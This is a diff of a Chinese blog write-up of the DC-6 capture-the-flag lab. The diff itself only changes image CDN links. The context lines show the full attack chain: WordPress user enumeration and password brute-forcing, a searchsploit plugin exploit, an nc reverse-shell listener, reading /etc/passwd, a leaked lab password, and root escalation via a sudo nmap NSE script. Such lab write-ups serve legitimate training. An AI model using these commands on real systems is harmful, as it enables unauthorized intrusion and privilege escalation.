@@ -27,7 +27,7 @@ date: 2026-03-15 12:00:00
 
 ### 1.1 主机发现
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image1.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image1.png)
 
 目标 IP：`192.168.168.169`
 
@@ -37,13 +37,13 @@ date: 2026-03-15 12:00:00
 nmap -A -p- 192.168.168.169
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image2.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image2.png)
 
 ### 1.3 配置域名解析
 
 访问 `192.168.168.169` 时自动跳转到了域名，导致打不开：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image3.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image3.png)
 
 需要修改 hosts 文件配置域名解析。
 
@@ -64,11 +64,11 @@ echo "192.168.168.169 wordy" >> /etc/hosts
 
 CMS 是 WordPress：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image4.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image4.png)
 
 > 提示这个漏洞肯定和插件有关。
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image5.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image5.png)
 
 ### 2.1 WPScan 扫描
 
@@ -76,13 +76,13 @@ CMS 是 WordPress：
 wpscan --url http://wordy/
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image6.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image6.png)
 
 ```
 http://wordy/wp-content/uploads/  没用
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image7.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image7.png)
 
 ### 2.2 目录扫描
 
@@ -90,11 +90,11 @@ http://wordy/wp-content/uploads/  没用
 dirsearch -u http://wordy
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image8.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image8.png)
 
 找到后台登录地址：`http://wordy/wp-login.php`
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image9.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image9.png)
 
 ### 2.3 枚举用户名
 
@@ -102,7 +102,7 @@ dirsearch -u http://wordy
 wpscan --url http://wordy/ -e u
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image10.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image10.png)
 
 创建用户名字典：
 
@@ -127,7 +127,7 @@ wpscan --url http://wordy/ -U users.txt -P passwords.txt
 
 登录成功：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image11.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image11.png)
 
 ---
 
@@ -148,7 +148,7 @@ wpscan --url http://wordy/ -e ap --plugins-detection aggressive
 | wpscan --url ... -e ap | 全部（All） | 扫描几百个常用插件的路径 |
 | ... --plugins-detection aggressive | 激进（Aggressive） | 暴力猜测数千个插件路径 |
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image12.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image12.png)
 
 ### 4.2 搜索插件漏洞 exp
 
@@ -156,7 +156,7 @@ wpscan --url http://wordy/ -e ap --plugins-detection aggressive
 searchsploit plainview activity
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image13.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image13.png)
 
 快捷复制 exp 文件：
 
@@ -164,7 +164,7 @@ searchsploit plainview activity
 searchsploit -m 45274
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image14.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image14.png)
 
 ### 4.3 利用漏洞
 
@@ -175,11 +175,11 @@ python -m http.server 5566
 
 失败了换成下面那个运行 python 文件：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image15.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image15.png)
 
 成功取得 Web 权限，查看当前权限：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image16.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image16.png)
 
 ---
 
@@ -199,7 +199,7 @@ nc -lvnp 5566
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image17.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image17.png)
 
 查看系统用户：
 
@@ -207,7 +207,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 cat /etc/passwd
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image18.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image18.png)
 
 ---
 
@@ -217,7 +217,7 @@ cat /etc/passwd
 
 在 mark 的目录下找到 graham 的密码：`GSo7isUM1D4`
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image19.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image19.png)
 
 ### 6.2 SSH 登录
 
@@ -227,7 +227,7 @@ cat /etc/passwd
 ssh graham@192.168.168.169
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image20.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image20.png)
 
 ---
 
@@ -237,9 +237,9 @@ ssh graham@192.168.168.169
 
 在 jens 目录下找到一个 sh 文件：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image21.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image21.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image22.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image22.png)
 
 查看 sudo 权限：
 
@@ -250,7 +250,7 @@ ls -l backups.sh
 
 graham 没权限运行：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image23.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image23.png)
 
 jens 可以无密码运行：
 
@@ -268,7 +268,7 @@ sudo -u jens ./backups.sh
 sudo -l
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image24.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image24.png)
 
 ### 7.2 nmap 脚本提权
 
@@ -283,11 +283,11 @@ echo 'os.execute("/bin/sh")' > /tmp/shell.nse
 sudo nmap --script=/tmp/shell.nse
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image25.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image25.png)
 
 出了点问题，不过很好解决：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image26.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image26.png)
 
 > 虽然不显示，但仍然有效（复制粘贴就行），或者用 `python -c 'import pty;pty.spawn("/bin/bash")'` 也可以，也有可能是我的 xshell 的原因。
 
@@ -295,7 +295,7 @@ sudo nmap --script=/tmp/shell.nse
 
 成功提权到 root，取得 flag：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-6_image27.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image27.png)
 
 ---
 
